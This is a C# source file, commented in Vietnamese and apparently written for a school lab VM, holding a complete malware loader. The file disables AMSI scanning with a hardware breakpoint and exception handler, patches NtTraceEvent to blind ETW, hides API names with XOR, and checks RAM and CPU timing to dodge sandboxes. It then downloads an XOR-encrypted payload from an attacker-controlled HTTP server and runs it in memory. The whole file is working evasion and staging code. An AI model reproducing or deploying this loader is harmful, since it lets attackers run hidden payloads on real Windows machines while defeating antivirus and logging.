// FinalLoaderV4.cs — Loader từ tài liệu thầy, đã fix bug + adapt
// Fix: ctx.GpRegs[0] thay vì ctx.GpRegs (array assignment bug)
// Fix C# 5 compat: out var → khai báo trước, 20_000_000 → 20000000,
//   GC.GetGCMemoryInfo() → GlobalMemoryStatusEx, TickCount64 → TickCount,
//   async Task Main → sync + .GetAwaiter().GetResult()
// Môi trường: VM cô lập nhà trường
using System;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace FinalLoaderV4
{
    public class Program
    {
        // Key để decrypt tên hàm/dll trong code (tránh plain string)
        const string STRING_KEY = "LabSecretKey2026";

        [DllImport("kernel32", EntryPoint = "GetProcAddress")]
        static extern IntPtr _GetProcAddress(IntPtr hMod, string name);
        [DllImport("kernel32", EntryPoint = "LoadLibraryA")]
        static extern IntPtr _LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentThread();
        [DllImport("ntdll")]
        static extern int NtGetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("ntdll")]
        static extern int NtSetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("kernel32")]
        static extern IntPtr AddVectoredExceptionHandler(uint first, PVECTORED_EXCEPTION_HANDLER handler);
        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint old);
        // FIX: dùng GlobalMemoryStatusEx thay GC.GetGCMemoryInfo() (.NET Core only)
        [DllImport("kernel32")]
        static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

        delegate int PVECTORED_EXCEPTION_HANDLER(ref EXCEPTION_POINTERS ep);

        [StructLayout(LayoutKind.Sequential)]
        struct MEMORYSTATUSEX
        {
            public uint  dwLength;
            public uint  dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_RECORD
        {
            public uint    ExceptionCode;
            public uint    ExceptionFlags;
            public IntPtr  ExceptionRecordPtr;
            public IntPtr  ExceptionAddress;
            public uint    NumberParameters;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_POINTERS
        {
            public IntPtr ExceptionRecord;
            public IntPtr ContextRecord;
        }

        const uint CONTEXT_DEBUG_REGISTERS     = 0x00010010;
        const uint EXCEPTION_SINGLE_STEP       = 0x80000004;
        const int  EXCEPTION_CONTINUE_EXECUTION = -1;

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ulong[]  p1;
            public uint     ContextFlags;
            public uint     MxCsr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ushort[] SegRegs;
            public uint     EFlags;
            public ulong    Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
            public ulong[]  GpRegs; // [0]=Rax, [1]=Rcx, ...
        }

        // Giữ reference để GC không thu hồi delegate
        static PVECTORED_EXCEPTION_HANDLER vehCallback;
        static IntPtr targetAmsiAddr = IntPtr.Zero;

        // ============================================================
        // Decrypt tên hàm: hex XOR với STRING_KEY
        // Tránh plain string "amsi.dll", "AmsiScanBuffer"... trong binary
        // ============================================================
        static string Dec(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            byte[] key = Encoding.UTF8.GetBytes(STRING_KEY);
            byte[] res = new byte[bytes.Length];
            for (int i = 0; i < bytes.Length; i++)
                res[i] = (byte)(bytes[i] ^ key[i % key.Length]);
            return Encoding.UTF8.GetString(res);
        }

        // ============================================================
        // VEH PATCHLESS AMSI — kỹ thuật từ DBGMAN
        // Hardware breakpoint DR0 tại AmsiScanBuffer
        // Handler bắt exception → set RAX=0 → AMSI_RESULT_CLEAN
        // Không write byte nào vào amsi.dll → không bị detect
        // ============================================================
        static int VehHandler(ref EXCEPTION_POINTERS ep)
        {
            var rec = (EXCEPTION_RECORD)Marshal.PtrToStructure(
                          ep.ExceptionRecord, typeof(EXCEPTION_RECORD));

            if (rec.ExceptionCode == EXCEPTION_SINGLE_STEP &&
                rec.ExceptionAddress == targetAmsiAddr)
            {
                var ctx = (CONTEXT)Marshal.PtrToStructure(
                              ep.ContextRecord, typeof(CONTEXT));

                // FIX BUG: code gốc ctx.GpRegs = 0 (gán cả array — lỗi)
                // Đúng: ctx.GpRegs[0] = 0 → RAX = 0 = AMSI_RESULT_CLEAN
                ctx.GpRegs[0] = 0;

                // Tắt RF flag để không loop exception vô tận
                ctx.EFlags &= ~(uint)0x10000;

                Marshal.StructureToPtr(ctx, ep.ContextRecord, false);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return 0; // pass to next handler
        }

        static void SetupVehAmsi()
        {
            vehCallback    = new PVECTORED_EXCEPTION_HANDLER(VehHandler);
            AddVectoredExceptionHandler(1, vehCallback);

            // Dec() để tên hàm không xuất hiện plain text trong binary
            IntPtr hAmsi   = _LoadLibrary(Dec("0D0411104D4F4F4A")); // "amsi.dll"
            targetAmsiAddr = _GetProcAddress(hAmsi, Dec("2D0411103028626D40030707004B")); // "AmsiScanBuffer"
            if (targetAmsiAddr == IntPtr.Zero) return;

            var ctx        = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
            IntPtr hThread = GetCurrentThread();
            NtGetContextThread(hThread, ref ctx);

            ctx.Dr0 = (ulong)targetAmsiAddr.ToInt64();
            ctx.Dr7 = 0x1; // enable local breakpoint 0, execute type

            NtSetContextThread(hThread, ref ctx);
        }

        // ============================================================
        // ETW BYPASS — patch NtTraceEvent: xor eax,eax; ret
        // ============================================================
        static void EtwBypass()
        {
            IntPtr hNtdll  = _LoadLibrary(Dec("020D160B1F454F4A")); // "ntdll.dll"
            IntPtr ntTrace = _GetProcAddress(hNtdll, Dec("220D3615124866664719161B56")); // "NtTraceEvent"
            if (ntTrace == IntPtr.Zero) return;

            byte[] patch = { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret

            // FIX CS# 5: khai báo biến trước thay vì "out uint old" inline
            uint old = 0;
            uint discard = 0;
            VirtualProtect(ntTrace, (UIntPtr)3, 0x40, out old);
            Marshal.Copy(patch, 0, ntTrace, 3);
            // FIX C# 5: "out _" discard không hợp lệ → dùng biến dummy
            VirtualProtect(ntTrace, (UIntPtr)3, old, out discard);
        }

        // ============================================================
        // ANTI-SANDBOX — CPU timing thay vì sleep
        // Sandbox accelerate time → vòng lặp tính toán xong quá nhanh
        // ============================================================
        static bool AntiSandbox()
        {
            // FIX: GC.GetGCMemoryInfo() chỉ có trên .NET Core → dùng GlobalMemoryStatusEx
            var ms = new MEMORYSTATUSEX();
            ms.dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX));
            GlobalMemoryStatusEx(ref ms);
            ulong ramGB = ms.ullTotalPhys / (1024UL * 1024UL * 1024UL);
            if (ramGB < 4) return false;

            // CPU timing: 20 triệu phép tính sin/cos
            // Máy thật: ~500–2000ms | Sandbox accelerated: < 500ms
            // FIX: Environment.TickCount64 (.NET 5+) → (long)Environment.TickCount (.NET 2+)
            long t0 = (long)Environment.TickCount;
            double k = 1.0;
            // FIX: 20_000_000 (C# 7 separator) → 20000000
            for (int i = 0; i < 20000000; i++)
                k = Math.Sin(k) + Math.Cos(k);
            if (((long)Environment.TickCount - t0) < 500) return false;

            return true;
        }

        // XOR decrypt payload
        static byte[] XorBytes(byte[] data, string key)
        {
            byte[] kk = Encoding.UTF8.GetBytes(key);
            byte[] r  = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (byte)(data[i] ^ kk[i % kk.Length]);
            return r;
        }

        // Assembly.Load + gọi hàm Run() trong class Target
        static void RunAssembly(byte[] asmBytes)
        {
            try
            {
                var asm    = Assembly.Load(asmBytes);
                var type   = asm.GetType("Target");
                var method = type.GetMethod("Run",
                    BindingFlags.Static | BindingFlags.Public);
                method.Invoke(null, null);
            }
            catch { }
        }

        // ============================================================
        // MAIN — được gọi từ Stager.ps1 qua Assembly.Load + reflection
        // FIX: async Task Main → void Main, dùng .GetAwaiter().GetResult()
        //   vì C# 5 không hỗ trợ async entry point
        // args[0] = xorKey
        // args[1] = URL payload.bin trên Kali HTTP server
        // args[2] = payloadKey
        // ============================================================
        public static void Main(string[] args)
        {
            if (!AntiSandbox()) return;
            SetupVehAmsi();
            EtwBypass();

            if (args.Length < 3) return;
            string xorKey     = args[0];
            string payloadUrl = args[1];
            string payloadKey = args[2];

            byte[] enc = null;
            try
            {
                using (var handler = new HttpClientHandler())
                using (var client  = new HttpClient(handler))
                {
                    client.DefaultRequestHeaders.UserAgent.ParseAdd(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    // FIX: await không dùng được trong void Main C# 5
                    // → .GetAwaiter().GetResult() chạy sync
                    enc = client.GetByteArrayAsync(payloadUrl).GetAwaiter().GetResult();
                }
            }
            catch { return; }

            byte[] data = XorBytes(enc, payloadKey);
            RunAssembly(data);
        }
    }
}